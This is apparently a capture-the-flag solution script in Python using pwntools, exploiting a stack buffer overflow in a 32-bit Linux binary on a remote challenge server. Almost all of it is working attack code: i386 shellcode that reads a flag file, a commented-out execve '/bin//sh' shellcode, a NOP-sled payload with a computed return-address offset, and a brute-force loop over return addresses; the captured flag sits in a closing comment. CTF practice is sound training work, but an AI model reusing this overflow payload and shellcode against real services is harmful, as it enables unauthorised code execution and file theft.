from pwn import *

context.arch = "i386"
context.os = "linux"

S = process("./bin")

# shellcode = asm(\
#     '''
#     xor eax, eax
#     xor edx, edx
#     xor ecx, ecx
#     push eax
#     push 0x68732f2f
#     push 0x6e69622f
#     mov ebx, esp
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     inc eax
#     int 0x80


#     mov al, 1
#     xor ebx, ebx
#     int 0x80
# ''')

shellcode = asm(\
    '''
    xor eax, eax
    push eax
    jmp short shell
start:
    xor eax, eax
    xor edx, edx
    pop ebx
    mov al, 0x5
    xor ecx, ecx
    xor edx, edx
    int 0x80

    xor edx, edx
    mov dl, 0x40
    sub esp, edx
    mov ebx, eax
    xor eax, eax
    mov al, 3
    mov ecx, esp
    int 0x80

    xor eax, eax
    xor ebx, ebx
    xor edx, edx
    mov al, 4
    mov bl, 1
    mov ecx, esp
    mov dl, 0x40
    int 0x80

    mov al, 1
    xor ebx, ebx
    int 0x80

    shell:
        call start
        .ascii "/home/ctf/flag"
''')


v2Shellcode = asm('''mov al, 0xb''')
print(asm('''int 0x80'''))

print(v2Shellcode)
username = 0xffffce16
eip = 0xffffce2c

offset = eip - username

payload = offset * b'A' + p32(username + 50) + 100 * b'\x90' + shellcode

with open("payload.bin", "wb") as f:
    f.write(payload)


for i in range(300, 400):
    try:
        #S = process("./bin") 46/47
        S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10007) #341
        payload = b'A' * offset + p32(eip -30000+ i*100) + b'\x90' * 500 + shellcode
        print(S.recvuntil(b" your username: "))
        S.sendline(payload)
        output = S.recvall()
        print(f"Attempt {i} succeeded")
        print(output)
        S.close()
    except EOFError as e:
        print(f"Attempt {i} failed: {e}")

# payload = b'A' * offset + p32(eip -5000+ 50*100) + b'\x90' * 500 + shellcode


print(S.recvuntil(b"ame: "))
S.sendline(payload)
S.interactive()
# print(shellcode)
# print(b'\n' in shellcode)
# print(b'\x00' in shellcode)
# print(b'\x0a' in shellcode)
# print(b'\x0d' in shellcode)
# print(b'\x20' in shellcode)
# print(b'\x09' in shellcode)

# STT{WELL_IT_CAN_BE_CASH_ME_OUTSIDE_HOW_BOW_DAH}